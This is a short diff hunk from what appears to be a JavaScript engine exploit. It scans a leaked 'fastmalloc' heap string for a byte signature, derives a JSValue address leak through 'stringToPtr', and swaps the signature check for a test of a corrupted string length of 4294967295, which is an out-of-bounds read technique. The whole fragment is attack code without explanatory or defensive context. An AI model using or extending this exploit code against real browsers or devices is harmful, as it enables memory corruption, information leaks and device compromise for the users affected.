@@ -217,15 +217,8 @@ while(jsvalue_leak === null)
     Object.defineProperties({}, props);
     for(var i = 0; i < 0x100000; i++)
     {
-        if(fastmalloc.charCodeAt(i) == 0x42
-        && fastmalloc.charCodeAt(i+1) == 0x44
-        && fastmalloc.charCodeAt(i+2) == 0x43
-        && fastmalloc.charCodeAt(i+3) == 0x41
-        && fastmalloc.charCodeAt(i+4) == 0
-        && fastmalloc.charCodeAt(i+5) == 0
-        && fastmalloc.charCodeAt(i+6) == 254
-        && fastmalloc.charCodeAt(i+7) == 255
-        && fastmalloc.charCodeAt(i+24) == 14
+        if(fastmalloc.length == 4294967295
+       
         )
         {
             jsvalue_leak = stringToPtr(fastmalloc, i+32);
